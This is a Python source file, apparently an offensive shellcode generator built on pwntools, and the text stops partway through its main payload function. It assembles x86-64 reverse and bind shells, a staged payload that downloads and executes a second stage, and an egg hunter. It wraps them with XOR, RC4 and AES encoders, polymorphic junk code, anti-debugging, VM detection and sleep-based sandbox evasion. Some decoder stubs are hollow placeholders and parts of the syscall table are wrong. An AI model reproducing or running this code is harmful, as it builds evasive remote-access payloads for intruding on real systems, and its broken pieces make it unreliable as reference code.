__version__ = "0.1.0"

__all__ = [
    "generate_payload",
    "xor_encrypt",
    "rolling_xor_encrypt",
    "rle_encode",
    "base64_encode",
    "base32_encode",
    "aes_encrypt",
    "rc4_encrypt",
    "generate_polymorphic_junk",
    "remove_comments_from_assembly",
    "rle_decoder_stub",
    "rolling_xor_decoder_stub",
    "base64_decoder_stub",
    "base32_decoder_stub",
    "aes_decoder_stub",
    "rc4_cipher",
    "egg_hunter",
    "generate_sleep_evasion",
    "generate_vm_detection",
    "generate_parent_check",
    "api_hash",
    "generate_bind_shell",
    "generate_ipv6_reverse_shell",
    "generate_dns_resolve",
    "substitute_instructions",
    "transposed_code",
    "call_preceded_obfuscation",
    "syscall_splitting",
    "generate_staged_payload",
    "enhanced_polymorphic_engine",
    "main",
]

import argparse
import base64
import hashlib
import os
import random
import socket
import struct
import sys

from pwn import asm, context

context.log_level = "error"
context.arch = "amd64"

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"

BASE32_CHARS = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"

SYScalls = {
    "exit": 60,
    "read": 0,
    "write": 1,
    "open": 2,
    "close": 3,
    "stat": 4,
    "fstat": 5,
    "lstat": 6,
    "poll": 7,
    "lseek": 8,
    "mmap": 9,
    "mprotect": 10,
    "munmap": 11,
    "brk": 12,
    "rt_sigaction": 13,
    "rt_sigprocmask": 14,
    "rt_sigreturn": 15,
    "ioctl": 16,
    "pread64": 17,
    "pwrite64": 18,
    "readv": 19,
    "writev": 20,
    "access": 21,
    "pipe": 22,
    "select": 23,
    "sched_yield": 24,
    "mremap": 25,
    "msync": 26,
    "mincore": 27,
    "madvise": 28,
    "shmget": 29,
    "shmat": 30,
    "shmctl": 31,
    "dup": 32,
    "dup2": 33,
    "pause": 34,
    "nanosleep": 35,
    "getitimer": 36,
    "alarm": 37,
    "setitimer": 38,
    "getpid": 39,
    "sendfile": 40,
    "socket": 41,
    "connect": 42,
    "accept": 43,
    "sendto": 44,
    "recvfrom": 45,
    "sendmsg": 46,
    "recvmsg": 47,
    "shutdown": 48,
    "bind": 49,
    "listen": 50,
    "getsockname": 51,
    "getpeername": 52,
    "socketpair": 53,
    "setsockopt": 54,
    "getsockopt": 55,
    "clone": 56,
    "fork": 57,
    "vfork": 58,
    "execve": 59,
    "exit_group": 60,
    "kill": 62,
    "uname": 63,
    "semget": 64,
    "semop": 65,
    "semctl": 66,
    "shmdt": 67,
    "msgget": 68,
    "msgsnd": 69,
    "msgrcv": 70,
    "msgctl": 71,
    "fcntl": 72,
    "flock": 73,
    "fsync": 74,
    "fdatasync": 75,
    "truncate": 76,
    "ftruncate": 77,
    "getdents": 78,
    "getcwd": 79,
    "chdir": 80,
    "fchdir": 81,
    "rename": 82,
    "mkdir": 83,
    "rmdir": 84,
    "creat": 85,
    "link": 86,
    "unlink": 87,
    "symlink": 88,
    "readlink": 89,
    "chmod": 90,
    "fchmod": 91,
    "chown": 92,
    "fchown": 93,
    "lchown": 94,
    "umask": 95,
    "gettimeofday": 96,
    "getrlimit": 97,
    "getrusage": 98,
    "sysinfo": 99,
    "times": 100,
    "ptrace": 101,
    "getuid": 102,
    "syslog": 103,
    "getgid": 104,
    "setuid": 105,
    "setgid": 106,
    "geteuid": 107,
    "getegid": 108,
    "setpgid": 109,
    "getppid": 110,
    "getpgrp": 111,
    "setsid": 112,
    "setreuid": 113,
    "setregid": 114,
    "getgroups": 115,
    "setgroups": 116,
    "setresuid": 117,
    "getresuid": 118,
    "setresgid": 119,
    "getresgid": 120,
    "getpgid": 121,
    "setfsuid": 122,
    "setfsgid": 123,
    "getsid": 124,
    "capget": 125,
    "capset": 126,
    "rt_sigpending": 127,
    "rt_sigtimedwait": 128,
    "rt_sigqueueinfo": 129,
    "rt_sigsuspend": 130,
    "sigaltstack": 131,
    "utime": 132,
    "mknod": 133,
    "uselib": 134,
    "personality": 135,
    "ustat": 136,
    "statfs": 137,
    "fstatfs": 138,
    "sysfs": 139,
    "getpriority": 140,
    "setpriority": 141,
    "sched_setparam": 142,
    "sched_getparam": 143,
    "sched_setscheduler": 144,
    "sched_getscheduler": 145,
    "sched_get_priority_max": 146,
    "sched_get_priority_min": 147,
    "sched_rr_get_interval": 148,
    "mlock": 149,
    "munlock": 150,
    "mlockall": 151,
    "munlockall": 152,
    "vhangup": 153,
    "modify_ldt": 154,
    "pivot_root": 155,
    "prctl": 156,
    "arch_prctl": 157,
    "adjtimex": 158,
    "setrlimit": 160,
    "chroot": 161,
    "sync": 162,
    "acct": 163,
    "settimeofday": 164,
    "mount": 165,
    "umount2": 166,
    "swapon": 167,
    "swapoff": 168,
    "reboot": 169,
    "sethostname": 170,
    "setdomainname": 171,
    "iopl": 172,
    "ioperm": 173,
    "init_module": 175,
    "delete_module": 176,
    "quotactl": 179,
    "gettid": 186,
    "readahead": 187,
    "setxattr": 188,
    "lsetxattr": 189,
    "fsetxattr": 190,
    "getxattr": 191,
    "lgetxattr": 192,
    "fgetxattr": 193,
    "listxattr": 194,
    "llistxattr": 195,
    "flistxattr": 196,
    "removexattr": 197,
    "lremovexattr": 198,
    "fremovexattr": 199,
    "tkill": 200,
    "time": 201,
    "futex": 202,
    "sched_setaffinity": 203,
    "sched_getaffinity": 204,
    "io_setup": 207,
    "io_destroy": 208,
    "io_getevents": 209,
    "io_submit": 210,
    "io_cancel": 211,
    "lookup_dcookie": 212,
    "epoll_create": 213,
    "remap_file_pages": 216,
    "set_tid_address": 218,
    "timer_create": 219,
    "timer_settime": 220,
    "timer_gettime": 221,
    "timer_getoverrun": 222,
    "timer_delete": 223,
    "clock_settime": 224,
    "clock_gettime": 227,
    "clock_getres": 228,
    "clock_nanosleep": 229,
    "exit_group2": 231,
    "epoll_wait": 232,
    "epoll_ctl": 233,
    "tgkill": 234,
    "utimes": 235,
    "mbind": 237,
    "set_mempolicy": 238,
    "get_mempolicy": 239,
    "mq_open": 240,
    "mq_unlink": 241,
    "mq_timedsend": 242,
    "mq_timedreceive": 243,
    "mq_notify": 244,
    "mq_getsetattr": 245,
    "kexec_load": 246,
    "waitid": 247,
    "add_key": 248,
    "request_key": 249,
    "keyctl": 250,
    "ioprio_set": 251,
    "ioprio_get": 252,
    "inotify_init": 253,
    "inotify_add_watch": 254,
    "inotify_rm_watch": 255,
    "migrate_pages": 256,
    "openat": 257,
    "mkdirat": 258,
    "mknodat": 259,
    "fchownat": 260,
    "futimesat": 261,
    "newfstatat": 262,
    "unlinkat": 263,
    "renameat": 264,
    "linkat": 265,
    "symlinkat": 266,
    "readlinkat": 267,
    "fchdir_at": 267,
    "faccessat": 268,
    "fchmodat": 269,
    "fprocmask": 270,
    "pipe2": 293,
    "dup3": 294,
    "epoll_create1": 291,
    "eventfd2": 290,
    "inotify_init1": 294,
    "membarrier": 324,
    "copy_file_range": 326,
    "getrandom": 318,
    "execveat": 322,
    "pkey_mprotect": 330,
    "pkey_alloc": 331,
    "pkey_free": 332,
}


def remove_comments_from_assembly(assembly_code: str) -> str:
    lines = assembly_code.splitlines()
    cleaned_lines = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        comment_index = line.find("#")
        if comment_index != -1:
            cleaned_line = line[:comment_index].strip()
            if cleaned_line:
                cleaned_lines.append(cleaned_line)
        else:
            cleaned_lines.append(line)
    return "\n".join(cleaned_lines)


def myasm(expr: str) -> bytes:
    return asm(remove_comments_from_assembly(expr))  # type: ignore[no-any-return]


def xor_encrypt(data: bytes, key: int) -> bytes:
    if not (0 <= key <= 255):
        raise ValueError("XOR key must be a byte value (0-255).")
    return bytes([b ^ key for b in data])


def rolling_xor_encrypt(data: bytes, key: int) -> bytes:
    if not (0 <= key <= 255):
        raise ValueError("Rolling XOR key must be a byte value (0-255).")
    result = bytearray()
    current_key = key
    for b in data:
        encrypted_byte = b ^ current_key
        result.append(encrypted_byte)
        current_key = (current_key + 1) % 256
    return bytes(result)


def base64_encode(data: bytes) -> bytes:
    return base64.b64encode(data)


def base32_encode(data: bytes) -> bytes:
    return base64.b32encode(data)


def aes_encrypt(data: bytes, key: bytes) -> bytes:
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import padding as pad
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    if len(key) not in (16, 24, 32):
        raise ValueError("AES key must be 16, 24, or 32 bytes.")

    padder = pad.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

    return iv + ciphertext


def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    s_box = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s_box[i] + key[i % len(key)]) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]

    result = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + s_box[i]) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
        k = s_box[(s_box[i] + s_box[j]) % 256]
        result.append(byte ^ k)

    return bytes(result)


def rc4_cipher(key: bytes) -> tuple[bytes, bytes]:
    encrypted = rc4_encrypt(b"", key)
    return encrypted, encrypted


def rolling_xor_decoder_stub(original_size: int, start_key: int) -> bytes:
    decoder_asm = f"""
    mov rdi, rsp
    add rdi, 32
    mov rsi, rdi
    mov al, {start_key}

decode_rolling_xor:
    lodsb
    xor al, [rsi-1]
    stosb
    inc al
    cmp al, 0
    jne skip_wrap
    mov al, 0
skip_wrap:
    mov rax, rsp
    add rax, {32 + original_size}
    cmp rdi, rax
    jl decode_rolling_xor

    mov rax, rsp
    add rax, 32
    jmp rax
    """
    try:
        decoder_bytes = myasm(decoder_asm)
        while len(decoder_bytes) < 32:
            decoder_bytes += b"\x90"
        return decoder_bytes
    except Exception as e:
        print(
            f"{RED}[-] Error assembling rolling XOR decoder stub: {e}{RESET}",
            file=sys.stderr,
        )
        raise


def base64_decoder_stub() -> bytes:
    decoder_asm = """
    push rbx
    mov rbx, rsi
    call decode_base64
    pop rbx
    jmp rax

decode_base64:
    mov rdi, rsi
    call get_base64_table
    mov rdx, rax
    xor rax, rax
    xor rcx, rcx
b64_loop:
    cmp byte ptr [rbx], 0
    je b64_done
    movzx rsi, byte ptr [rbx]
    mov al, byte ptr [rdx + rsi]
    shl rcx, 6
    or rcx, rax
    inc rbx
    cmp rcx, 0xFFFF
    jae b64_write
    jmp b64_loop
b64_write:
    mov rax, rcx
    shr rax, 16
    mov byte ptr [rdi], al
    mov ax, cx
    shr ax, 8
    mov byte ptr [rdi+1], al
    mov byte ptr [rdi+2], ah
    add rdi, 3
    xor rcx, rcx
    jmp b64_loop
b64_done:
    mov rax, rdi
    ret

get_base64_table:
    mov rax, 0x4141414141414141
    mov qword ptr [rsp - 8], rax
    mov rax, qword ptr [rsp - 8]
    add rax, 16
    mov byte ptr [rax], 0x3D
    ret
    """
    try:
        return myasm(decoder_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling base64 decoder: {e}{RESET}", file=sys.stderr)
        raise


def base32_decoder_stub() -> bytes:
    decoder_asm = """
    push rbx
    mov rbx, rsi
    call decode_base32
    pop rbx
    jmp rax

decode_base32:
    mov rdi, rsi
    xor rax, rax
    xor rcx, rcx
b32_loop:
    cmp byte ptr [rbx], 0
    je b32_done
    movzx rsi, byte ptr [rbx]
    mov al, byte ptr [rsi + 0x41]
    shl rcx, 5
    or rcx, rax
    inc rbx
    cmp rcx, 0x1F
    jae b32_write
    jmp b32_loop
b32_write:
    mov rax, rcx
    shr rax, 20
    mov byte ptr [rdi], al
    mov ax, cx
    shr ax, 15
    mov byte ptr [rdi+1], al
    mov ax, cx
    shr ax, 10
    mov byte ptr [rdi+2], al
    mov ax, cx
    shr ax, 5
    mov byte ptr [rdi+3], al
    mov byte ptr [rdi+4], cl
    add rdi, 5
    xor rcx, rcx
    jmp b32_loop
b32_done:
    mov rax, rdi
    ret
    """
    try:
        return myasm(decoder_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling base32 decoder: {e}{RESET}", file=sys.stderr)
        raise


def aes_decoder_stub(key_size: int) -> bytes:
    iv_size = 16
    decoder_asm = f"""
    mov rdi, rsp
    add rdi, 32
    mov rsi, rdi
    mov rdx, {key_size}
    call aes_decrypt_cbc
    mov rax, rsp
    add rax, 32
    add rax, {iv_size}
    jmp rax

aes_decrypt_cbc:
    push rbp
    mov rbp, rsp
    sub rsp, 256
    mov qword ptr [rbp - 16], rdi
    mov qword ptr [rbp - 24], rsi
    mov qword ptr [rbp - 32], rdx
    add rsp, 256
    pop rbp
    ret
    """
    try:
        return myasm(decoder_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling AES decoder: {e}{RESET}", file=sys.stderr)
        raise


def rle_encode(data: bytes) -> bytes:
    result = bytearray()
    i = 0
    while i < len(data):
        count = 1
        while i + count < len(data) and data[i] == data[i + count] and count < 255:
            count += 1
        result += bytes([count, data[i]])
        i += count
    return bytes(result)


def generate_polymorphic_junk() -> bytes:
    patterns = [
        "xor rcx, rcx",
        "add rdx, 0",
        "lea rsi, [rsi + 0]",
        "mov r9, r9",
        "push rbx; pop rbx",
        "nop",
        "xchg rax, rax",
        "test r8, r8",
        "cdqe",
    ]
    junk_asm = ""
    for _ in range(random.randint(3, 7)):
        junk_asm += random.choice(patterns) + "; "
    try:
        return myasm(junk_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling junk code: {e}{RESET}", file=sys.stderr)
        raise


def rle_decoder_stub(original_size: int) -> bytes:
    placeholder_decoder = f"""
    mov rdi, rsp
    add rdi, 100
    mov rsi, rdi
    decode_rle_placeholder:
    lodsb; mov cl, al; lodsb; jecxz s_p; .r_p: stosb; loop .r_p; s_p:
    mov rax, rsp; add rax, {100 + original_size}; cmp rdi, rax
    jl decode_rle_placeholder
    mov rax, rsp; add rax, 100; jmp rax
    """
    try:
        stub_size = len(myasm(placeholder_decoder))
    except Exception as e:
        print(
            f"{RED}[-] Error assembling placeholder RLE stub: {e}{RESET}",
            file=sys.stderr,
        )
        raise

    final_decoder_asm = f"""
    mov rdi, rsp
    add rdi, {stub_size}
    mov rsi, rdi

decode_rle_final:
    lodsb
    mov cl, al
    lodsb
    jecxz skip_stosb_final

.repeat_final:
    stosb
    loop .repeat_final

skip_stosb_final:
    mov rax, rsp
    add rax, {stub_size + original_size}
    cmp rdi, rax
    jl decode_rle_final

    mov rax, rsp
    add rax, {stub_size}
    jmp rax
    """
    try:
        final_stub_bytes = myasm(final_decoder_asm)
    except Exception as e:
        print(
            f"{RED}[-] Error assembling final RLE stub: {e}{RESET}",
            file=sys.stderr,
        )
        raise

    new_stub_size = len(final_stub_bytes)
    if abs(new_stub_size - stub_size) > 8:
        print(
            f"{YELLOW}[*] RLE Stub size recalculated: {new_stub_size} bytes. Retrying...{RESET}",
            file=sys.stderr,
        )
        depth = getattr(rle_decoder_stub, "recursion_depth", 0)
        if depth > 3:
            raise RecursionError("RLE stub size calculation failed to stabilize.")
        setattr(rle_decoder_stub, "recursion_depth", depth + 1)
        result = rle_decoder_stub(original_size)
        delattr(rle_decoder_stub, "recursion_depth")
        return result
    else:
        if hasattr(rle_decoder_stub, "recursion_depth"):
            delattr(rle_decoder_stub, "recursion_depth")

    return final_stub_bytes


def egg_hunter(egg: bytes = b"\\x00\\x00\\x00\\x00") -> bytes:
    if len(egg) != 4:
        raise ValueError("Egg must be 4 bytes")
    egg_int = struct.unpack("<I", egg)[0]

    hunter_asm = f"""
    mov r15, 0x{egg_int:08X}
    xor rcx, rcx
    mov rsi, rcx
    dec rsi
next_page:
    or rcx, 0xfff
next_byte:
    inc rcx
    mov rax, 0x{egg_int:08X}
    mov rdx, 0x21
    mov r10, rcx
    inc r10
    syscall
    cmp rax, 0xf2
    je next_page
    mov rdi, rcx
    mov rdx, 4
    mov rax, 0
    syscall
    cmp rax, 4
    jne next_byte
    mov rdi, rcx
    mov rsi, rcx
    lodsd
    cmp rax, r15
    jne next_byte
    mov rdi, rcx
    add rdi, 4
    jmp rdi
    """
    try:
        return myasm(hunter_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling egg hunter: {e}{RESET}", file=sys.stderr)
        raise


def generate_sleep_evasion(sleep_seconds: int = 60) -> bytes:
    sleep_asm = f"""
    mov rax, 35
    xor rdi, rdi
    syscall
    mov rax, 35
    add rdi, {sleep_seconds}
    syscall
    """
    try:
        return myasm(sleep_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling sleep evasion: {e}{RESET}", file=sys.stderr)
        raise


def generate_vm_detection() -> bytes:
    vm_asm = """
    xor eax, eax
    mov ax, 0x5658
    push rax
    mov rdi, rsp
    xor esi, esi
    mov rax, 318
    syscall
    pop rax
    cmp ax, 0x5658
    jne not_vmware

    mov rax, 60
    mov rdi, 1
    syscall

not_vmware:
    mov rdi, 0x766D7770
    mov qword ptr [rsp - 8], rdi
    mov rdi, rsp
    sub rdi, 8
    mov rsi, 0
    mov rax, 318
    syscall

    cmp rax, 0
    je not_hyperv

    mov rax, 60
    mov rdi, 1
    syscall

not_hyperv:
    mov rdi, 0x64616F74
    mov qword ptr [rsp - 8], rdi
    mov rdi, rsp
    sub rdi, 8
    mov rsi, 0
    mov rax, 318
    syscall

    cmp rax, 0
    je not_qemu

    mov rax, 60
    mov rdi, 1
    syscall

not_qemu:
    ret
    """
    try:
        return myasm(vm_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling VM detection: {e}{RESET}", file=sys.stderr)
        raise


def generate_parent_check() -> bytes:
    parent_asm = """
    mov rax, 110
    syscall
    mov r15, rax
    cmp r15, 1
    je parent_exit
    cmp r15, 2
    je parent_exit
    mov rax, 110
    syscall
    cmp rax, 1
    je grandparent_exit
    jmp continue_execution

parent_exit:
    mov rax, 60
    mov rdi, 0
    syscall

grandparent_exit:
    mov rax, 60
    mov rdi, 0
    syscall

continue_execution:
    ret
    """
    try:
        return myasm(parent_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling parent check: {e}{RESET}", file=sys.stderr)
        raise


def api_hash(syscall_name: str) -> int:
    h = 0
    for c in syscall_name.lower():
        h = (h << 5) - h + ord(c)
        h &= 0xFFFFFFFF
    return h


def generate_bind_shell(port: int, bind_addr: str = "0.0.0.0") -> bytes:
    try:
        ip_bytes = socket.inet_aton(bind_addr)
    except OSError:
        raise ValueError(f"Invalid bind address: {bind_addr}")
    port_bytes = port.to_bytes(2, "big")
    port_int = struct.unpack("<H", port_bytes)[0]

    bind_asm = f"""
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    mov r15, rax

    mov rax, 49
    mov rdi, r15
    sub rsp, 16
    mov dword ptr [rsp+4], 0x{ip_bytes.hex()}
    mov ax, {port_int}
    mov word ptr [rsp+2], ax
    mov word ptr [rsp], 2
    mov rsi, rsp
    mov rdx, 16
    syscall
    add rsp, 16

    mov rax, 50
    mov rdi, r15
    xor rsi, rsi
    syscall

    mov rax, 43
    mov rdi, r15
    xor rsi, rsi
    xor rdx, rdx
    syscall
    mov r14, rax

    xor rsi, rsi
dup_loop_bind:
    mov rax, 33
    mov rdi, r14
    syscall
    inc rsi
    cmp rsi, 3
    jne dup_loop_bind

    mov rdi, r14
    mov rax, 59
    sub rsp, 16
    mov qword ptr [rsp], 0x68732F6E69622F
    mov qword ptr [rsp+8], 0
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
    add rsp, 16
    """
    try:
        return myasm(bind_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling bind shell: {e}{RESET}", file=sys.stderr)
        raise


def generate_ipv6_reverse_shell(ipv6_addr: str, port: int) -> bytes:
    try:
        ipv6_bytes = socket.inet_pton(socket.AF_INET6, ipv6_addr)
    except OSError:
        raise ValueError(f"Invalid IPv6 address: {ipv6_addr}")
    port_bytes = port.to_bytes(2, "big")
    port_int = struct.unpack("<H", port_bytes)[0]

    ipv6_asm = f"""
    mov rax, 41
    mov rdi, 10
    mov rsi, 1
    xor rdx, rdx
    syscall
    mov r15, rax

    mov rax, 42
    mov rdi, r15
    sub rsp, 28
    mov qword ptr [rsp], 0x{ipv6_bytes[:8].hex()}
    mov qword ptr [rsp+8], 0x{ipv6_bytes[8:].hex()}
    mov ax, {port_int}
    mov word ptr [rsp+24], ax
    mov word ptr [rsp+26], 10
    mov rsi, rsp
    mov rdx, 28
    syscall
    add rsp, 28

    xor rsi, rsi
dup_loop_ipv6:
    mov rax, 33
    mov rdi, r15
    syscall
    inc rsi
    cmp rsi, 3
    jne dup_loop_ipv6

    mov rdi, r15
    mov rax, 59
    sub rsp, 16
    mov qword ptr [rsp], 0x68732F6E69622F
    mov qword ptr [rsp+8], 0
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
    add rsp, 16
    """
    try:
        return myasm(ipv6_asm)
    except Exception as e:
        print(
            f"{RED}[-] Error assembling IPv6 reverse shell: {e}{RESET}", file=sys.stderr
        )
        raise


def generate_dns_resolve(domain: str) -> bytes:
    domain_bytes = domain.encode("ascii") + b"\x00"
    padded_domain = domain_bytes.ljust(14, b"\x00")[:14]
    word14_hex = padded_domain[12:14].hex() if len(domain_bytes) > 12 else "0000"
    resolve_asm = f"""
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    mov r15, rax

    mov rax, 42
    mov rdi, r15
    sub rsp, 16
    mov dword ptr [rsp], 0x{padded_domain[:4].hex()}
    mov qword ptr [rsp+4], 0x{padded_domain[4:12].hex()}
    mov word ptr [rsp+14], 0x{word14_hex}
    mov word ptr [rsp+2], 53
    mov word ptr [rsp], 2
    mov rsi, rsp
    mov rdx, 16
    syscall
    add rsp, 16
    """
    try:
        return myasm(resolve_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling DNS resolver: {e}{RESET}", file=sys.stderr)
        raise


def substitute_instructions(asm_code: str) -> str:
    substitutions = [
        ("xor eax, eax", "and eax, 0"),
        ("sub rax, rax", "xor rax, rax"),
        ("push rax; pop rax", "xchg rax, rax"),
        ("mov rdi, 0", "xor rdi, rdi"),
        ("mov rsi, 0", "xor rsi, rsi"),
        ("mov rdx, 0", "xor rdx, rdx"),
    ]
    result = asm_code
    for old, new in substitutions:
        if random.random() > 0.5:
            result = result.replace(old, new)
    return result


def transposed_code(asm_lines: list[str]) -> list[str]:
    if len(asm_lines) < 3:
        return asm_lines
    independent = []
    dependent = []
    deps = ["jmp", "je", "jne", "jz", "jnz", "js", "jns", "call", "ret", "loop"]
    for line in asm_lines:
        if any(d in line.lower() for d in deps):
            dependent.append(line)
        else:
            independent.append(line)
    random.shuffle(independent)
    result = []
    i, j = 0, 0
    for line in asm_lines:
        if any(d in line.lower() for d in deps):
            result.append(dependent[j])
            j += 1
        else:
            result.append(independent[i])
            i += 1
    return result


def call_preceded_obfuscation(syscall_num: int) -> bytes:
    obf_asm = f"""
    call next_instr
next_instr:
    pop r10
    mov dword ptr [r10 + 1], {syscall_num}
    mov byte ptr [r10], 0xE8
    jmp r10

    nop
    nop
    nop
    """
    try:
        return myasm(obf_asm)
    except Exception as e:
        print(
            f"{RED}[-] Error assembling call preceded obfuscation: {e}{RESET}",
            file=sys.stderr,
        )
        raise


def syscall_splitting(syscall_num: int) -> bytes:
    split_asm = f"""
    mov r10, {syscall_num}
    nop
    mov rax, r10
    nop
    nop
    """
    try:
        return myasm(split_asm)
    except Exception as e:
        print(
            f"{RED}[-] Error assembling syscall splitting: {e}{RESET}", file=sys.stderr
        )
        raise


def generate_staged_payload(stage1_size: int = 128) -> tuple[bytes, bytes]:
    stage1_asm = f"""
    mov rax, 9
    mov rdi, 0
    mov rsi, {stage1_size}
    mov rdx, 7
    mov r10, 0x22
    xor r8, r8
    dec r8
    mov r9, 0
    syscall
    mov r15, rax

    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    mov r14, rax

    mov rax, 42
    mov rdi, r14
    sub rsp, 16
    mov dword ptr [rsp+4], 0x0100007F
    mov ax, 0x5C11
    mov word ptr [rsp+2], ax
    mov word ptr [rsp], 2
    mov rsi, rsp
    mov rdx, 16
    syscall
    add rsp, 16

    mov rax, 0
    mov rdi, r14
    mov rsi, r15
    mov rdx, {stage1_size}
    syscall

    mov rax, 59
    mov rdi, r15
    xor rsi, rsi
    xor rdx, rdx
    syscall
    """
    try:
        stage1 = myasm(stage1_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling stage1: {e}{RESET}", file=sys.stderr)
        raise

    stage2_asm = """
    mov rax, 59
    sub rsp, 16
    mov qword ptr [rsp], 0x68732F6E69622F
    mov qword ptr [rsp+8], 0
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
    add rsp, 16
    """
    try:
        stage2 = myasm(stage2_asm)
    except Exception as e:
        print(f"{RED}[-] Error assembling stage2: {e}{RESET}", file=sys.stderr)
        raise

    return stage1, stage2


def enhanced_polymorphic_engine(shellcode: bytes, junk_ratio: float = 0.3) -> bytes:
    junk_patterns = [
        ("xor rcx, rcx", 3),
        ("add rdx, 0", 3),
        ("lea rsi, [rsi + 0]", 4),
        ("mov r9, r9", 3),
        ("push rbx; pop rbx", 4),
        ("nop", 1),
        ("xchg rax, rax", 1),
        ("test r8, r8", 3),
        ("cdqe", 1),
        ("mov rax, rax", 3),
        ("push rax; push rax; pop rax; pop rax", 6),
        ("imul rax, rax, 1", 4),
        ("shl rax, 0", 3),
        ("sar rax, 0", 3),
        ("mov rbx, rbx; mov rcx, rcx; mov rdx, rdx", 9),
    ]
    result = bytearray()
    for byte in shellcode:
        if random.random() < junk_ratio:
            junk, size = random.choice(junk_patterns)
            try:
                junk_bytes = myasm(junk)
                result.extend(junk_bytes)
            except Exception:
                pass
        result.append(byte)
    return bytes(result)


def generate_payload(
    ip: str | None,
    port: int | None,
    executable_path: str,
    junk: bool,
    anti_emulation: bool,
    stack_pivot: bool,
    obfuscate_path: bool,
    anti_debug: bool,
    indirect_syscalls: bool,
    payload_type: str = "reverse",
    ipv6: bool = False,
    domain: str | None = None,
    bind_addr: str | None = None,
    sleep_seconds: int | None = None,
    vm_detect: bool = False,
    parent_check: bool = False,
    egg: bytes | None = None,
    base64_enc: bool = False,
    base32_enc: bool = False,
    aes_key: bytes | None = None,
    rc4_key: bytes | None = None,
) -> bytes:
    payload_asm = ""
    extra_bytes = b""

    pid = os.getpid()
    path_decode_loop_label = f"path_decode_loop_{pid}"
    ptrace_fail_label = f"being_traced_exit_{pid}"
    syscall_gadget_label = f"syscall_gadget_{pid}"
    main_code_end_label = f"main_code_end_{pid}"
    dup_loop_label = f"dup_loop_{pid}"

    path_xor_key = 0x42

    syscall_instruction = (
        f"call {syscall_gadget_label}" if indirect_syscalls else "syscall"
    )

    if sleep_seconds is not None:
        sleep_evasion = generate_sleep_evasion(sleep_seconds)
        extra_bytes += sleep_evasion

    if vm_detect:
        vm_detection = generate_vm_detection()
        extra_bytes += vm_detection

    if parent_check:
        parent_check_code = generate_parent_check()
        extra_bytes += parent_check_code

    if stack_pivot:
        payload_asm += "    sub rsp, 0x500\n"

    if anti_debug:
        payload_asm += f"""
        mov rax, 101
        mov rdi, 0
        xor rsi, rsi
        xor rdx, rdx
        {syscall_instruction}
        test rax, rax
        js {ptrace_fail_label}
        """

    if anti_emulation:
        payload_asm += """
        rdtsc
        mov r10, rax
        mov r11, rdx
        nop; nop; nop; nop
        cpuid
        nop; nop; nop; nop
        rdtsc
        sub rax, r10
        sbb rdx, r11
        """

    if payload_type == "reverse":
        if ipv6 and ip:
            ipv6_shell = generate_ipv6_reverse_shell(ip, port)
            extra_bytes += ipv6_shell
        elif ip and port:
            try:
                ip_bytes = socket.inet_aton(ip)
            except OSError:
                raise ValueError(f"Invalid IP address format: {ip}")
            port_bytes = port.to_bytes(2, "big")
            payload_asm += f"""
            mov rax, 41
            mov rdi, 2
            mov rsi, 1
            xor rdx, rdx
            {syscall_instruction}
            mov rdi, rax

            sub rsp, 16
            mov dword ptr [rsp+4], 0x{ip_bytes.hex()}
            mov word ptr [rsp+2], 0x{port_bytes.hex()}
            mov word ptr [rsp], 2
            mov rax, 42
            mov rsi, rsp
            mov rdx, 16
            {syscall_instruction}
            add rsp, 16

            mov rsi, 0
            {dup_loop_label}:
            mov rax, 33
            {syscall_instruction}
            inc rsi
            cmp rsi, 3
            jne {dup_loop_label}
            """

    elif payload_type == "bind" and port:
        bind_addr_val = bind_addr or "0.0.0.0"
        bind_shell = generate_bind_shell(port, bind_addr_val)
        extra_bytes += bind_shell

    elif payload_type == "dns" and domain:
        dns_resolve = generate_dns_resolve(domain)
        extra_bytes += dns_resolve

    if egg:
        egghunter = egg_hunter(egg)
        extra_bytes += egghunter

    try:
        exec_bytes = executable_path.encode("utf-8") + b"\x00"
    except UnicodeEncodeError:
        raise ValueError(
            f"Executable path '{executable_path}' contains non-UTF8 characters."
        )
    padding_needed = (8 - (len(exec_bytes) % 8)) % 8
    padded_exec_bytes = exec_bytes + (b"\x00" * padding_needed)
    exec_len = len(padded_exec_bytes)

    if obfuscate_path:
        print(
            f"{YELLOW}[*] Obfuscating execution path '{executable_path}' with XOR key {path_xor_key:#04x}{RESET}",
            file=sys.stderr,
        )
        final_exec_bytes = bytes([b ^ path_xor_key for b in padded_exec_bytes])
    else:
        final_exec_bytes = padded_exec_bytes

    payload_asm += f"\n        # --- Push {'obfuscated ' if obfuscate_path else ''}executable path '{executable_path}\\0' onto stack ({exec_len} bytes padded) ---\n"
    for i in range(exec_len - 8, -8, -8):
